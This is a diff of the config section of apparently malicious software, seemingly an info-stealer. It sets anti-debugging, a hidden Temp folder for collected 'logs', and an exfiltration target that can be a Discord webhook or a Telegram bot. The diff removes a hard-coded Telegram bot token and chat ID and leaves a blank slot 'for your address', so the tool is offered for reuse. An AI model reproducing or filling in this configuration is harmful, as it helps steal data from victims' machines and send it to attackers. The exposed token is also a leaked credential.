@@ -7,7 +7,7 @@ class config:
     debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)
     pathToLogs = "\\AppData\\Local\\Temp\\{923462db-6578-4ed1-beaf-f03d9860d883}" #path where will be stored logs before sending (from user dir)
 
-    sendData = [1, "6875758020:AAGOUZ9iP8h45W5_OLQQPvd2_NwZKy7Zeq4", "6500557225"]# You can write your address for sending logs here
+    sendData = [] # You can write your address for sending logs here
 
     #example for Discord [0, "url of your WebHook", "null"]
     #example for Telegram [1, "HTTPAPI that you got from botFather", "your chat ID"]
